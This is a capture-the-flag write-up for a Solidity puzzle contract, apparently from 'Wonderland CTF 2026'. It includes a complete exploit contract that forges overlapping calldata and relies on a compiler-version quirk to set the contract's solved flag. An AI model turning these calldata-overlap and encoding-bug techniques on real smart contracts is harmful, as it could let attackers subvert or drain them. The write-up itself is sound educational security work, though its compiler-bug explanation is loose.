---
title: Encoded Spell CTF Writeup
description: >-
  Solution to the Wonderland CTF 2026 challenge
categories: [CTF]
tags: [technical]
pin: false
image:
  path: /assets/img/cure.jpg
---

## Challenge

Here's the challenge if you want to try it yourself:

> Powerful spells require intricate incantations. Only well-versed mages can unleash the power of ancient runes.

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

struct Spell {
    string name;
    bytes32[8] enchantments;
}

contract Challenge {
    bool        public unleashed;
    uint256     public mana;
    bytes32     public masterSeal;
    bytes32[8]  public weakSeals;

    constructor(address) {}

    function createMagicCircle(string calldata runes, bytes32 newMasterSeal) external {
        mana = msg.data.length;
        masterSeal = newMasterSeal;
        weakSeals = abi.decode(bytes(runes), (bytes32[8]));
    }

    function cast(Spell calldata spell) external {
        // Spells in the Grimoire
        bytes32 secretSpellName = keccak256(bytes(spell.name));
        require(
            (secretSpellName == keccak256("CURE")   && mana == 100) ||
            (secretSpellName == keccak256("CURA")   && mana == 200) ||
            (secretSpellName == keccak256("CURAGA") && mana == 300) ||
            (secretSpellName == keccak256("ULTIMA") && mana == 6e66)
        );

        // Each weak seal must be broken by a powerful enchantment
        for (uint i; i < weakSeals.length; i++) {
            bool brokenSeal = spell.enchantments[i] > weakSeals[i];
            require(brokenSeal);
        }

        // The power balance of the spell must match the one of the master seal
        require(keccak256(abi.encode(spell)) == masterSeal);

        // The full power of the spell is unleashed
        unleashed = true;
    }

    function isSolved() external view returns (bool) {
        return unleashed;
    }
}
```

## Solution

### Summary

The goal is to call `isSolved()` and get `true`. This requires calling `cast(Spell calldata spell)` in such a way that `unleashed` is set to `true`.

The `cast` function has three strict requirements:

1. The spell name must match the current `mana`:
- `"CURE"` → `mana == 100`
- `"CURA"` → `mana == 200`
- `"CURAGA"` → `mana == 300`
- `"ULTIMA`" → `mana == 6e66` (impossible in practice — calldata cannot be that large and it would be astronomically expensive)
2. Every enchantment must break the corresponding weak seal:
```js
spell.enchantments[i] > weakSeals[i]   // for i in 0..7
```
3. The encoded spell must match the master seal exactly
```js
keccak256(abi.encode(spell)) == masterSeal
```

Before casting, we must call `createMagicCircle(string calldata runes, bytes32 newMasterSeal)`. This function does three things:

- `mana = msg.data.length` (the raw calldata length of this call)
- `masterSeal = newMasterSeal`
- `weakSeals = abi.decode(bytes(runes), (bytes32[8]))`

We choose **CURAGA** because it requires a clean, achievable `mana == 300`. The exploit therefore crafts a exactly 300-byte calldata for `createMagicCircle` while satisfying all the overlap tricks below.

### Exploit Contract (Full Solution)

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "src/Challenge.sol";

contract Exploit {
    Challenge private immutable CHALLENGE;
    bytes32 MAX = bytes32(type(uint).max);

    constructor(Challenge challenge) {
        CHALLENGE = challenge;
    }

    function exploit() external {
        Spell memory spell;
        bytes32 masterSeal;
        bytes1 sharedByte;

        for (uint i = type(uint).max; i > 0; i--) {
            spell = Spell("CURAGA", [bytes32(i), MAX, MAX, MAX, MAX, MAX, MAX, MAX]);
            bytes memory encodedSpell = abi.encode(spell);
            assembly {
                mstore(add(encodedSpell, 0x160), 0) // MAGIC
            }
            masterSeal = keccak256(encodedSpell);
            sharedByte = masterSeal[0];

            // The last byte of weakSeals.length overlaps with the first byte of masterSeal
            if (sharedByte <= 0x07) {
                break;
            }
        }

        // The first of the weakSeals overlaps with the masterSeal with a 1-byte offset
        bytes32 firstWeakSeal = bytes32(masterSeal) << 8;
        bytes32[8] memory weakSeals = [firstWeakSeal, 0, 0, 0, 0, 0, 0, 0];

        // Pack the calldata so that it fits in 300 bytes
        bytes memory init = hex"0000000000000000000000000000000000000000000000000000000000000001";
        bytes memory end = hex"00000000000000";
        bytes memory data = abi.encodePacked(CHALLENGE.createMagicCircle.selector, init, sharedByte, weakSeals, end);

        (bool ok,) = address(CHALLENGE).call(data);
        require(ok, "Magic Circle Failed");
        CHALLENGE.cast(spell);

        require(CHALLENGE.isSolved(), "Challenge not solved");
    }
}
```

### Core Tricks

1. Mana = 300 bytes — The entire `createMagicCircle` call must be precisely 300 bytes long.

2. Calldata layout reuse / overlap — The `newMasterSeal` parameter and the `runes` string data share bytes in the calldata. Specifically:

- The first byte of `masterSeal` is placed where the LSB of the string length lives.
- `weakSeals[0]` is set to `masterSeal << 8` (shift left 1 byte) so the remaining 31 bytes of `masterSeal` can be reused from the calldata when Solidity reads `newMasterSeal`.

3. String length control — The string length's LSB is the first byte of `masterSeal`. We brute-force until this byte ≤ `0x07` so the decoded `bytes(runes)` length never overruns the 300-byte calldata (exactly 263 bytes of string data are available after the offset).

4. Solidity compiler bug — A subtle layout/encoding quirk in 0.8.13 around `abi.encode` of a struct containing a dynamic `string` + fixed `bytes32[8]` requires zeroing a specific memory word at offset `0x160` before taking the keccak256 hash. This is the "MAGIC" `mstore`.

### How the Calldata Overlap Works (Visualized)

Calldata layout (300 bytes total):

```
0-3     : createMagicCircle selector
4-35    : offset = 1          (points string data almost at the start)
36      : sharedByte          = masterSeal[0]
37-292  : weakSeals (256 bytes)
293-299 : 7 zero bytes (padding)
```

- `newMasterSeal` is read from bytes 36–67 → `sharedByte + first 31 bytes of weakSeals[0]`.
- Because `weakSeals[0] = masterSeal << 8`, those 31 bytes are exactly `masterSeal[1..31]`.
- Therefore `newMasterSeal` reconstructs the full `masterSeal` we computed.
- `runes` string data starts at byte 37 → `abi.decode(bytes(runes), (bytes32[8]))` gives exactly our `weakSeals` array.
- The string length word's LSB is also at byte 36 (`sharedByte`). Because `sharedByte ≤ 0x07`, length = `256 + sharedByte` ≤ 263 bytes, which fits perfectly inside the calldata.

### Why the Brute-Force + `i > weakSeals[0]`

- `weakSeals[0] = masterSeal << 8` (a large but random 256-bit number).
- `spell.enchantments[0] = i` (we start at `type(uint).max` and go down).
- Because `i` is enormous and `masterSeal << 8` is just a shifted random value, the inequality `i > weakSeals[0]` always holds for the `i` we select.
- The other seven enchantments are `type(uint).max`, which trivially beat the zero weak seals.

### Solidity Compiler Bug

The line `mstore(add(encodedSpell, 0x160), 0)` is the workaround for a subtle encoding/layout quirk present in Solidity 0.8.13 when `abi.encode` is used on a struct containing a dynamic `string` followed by a static `bytes32[8]`. Without this zeroing of the word immediately after the nominal encoded length (`0x160` bytes), the `keccak256` would not match what is later stored in `masterSeal`. This is the final "magic" piece that makes the equality check pass.

- Reference: [Head Overflow Bug in Calldata Tuple ABI-Reencoding](https://www.soliditylang.org/blog/2022/08/08/calldata-tuple-reencoding-head-overflow-bug/)
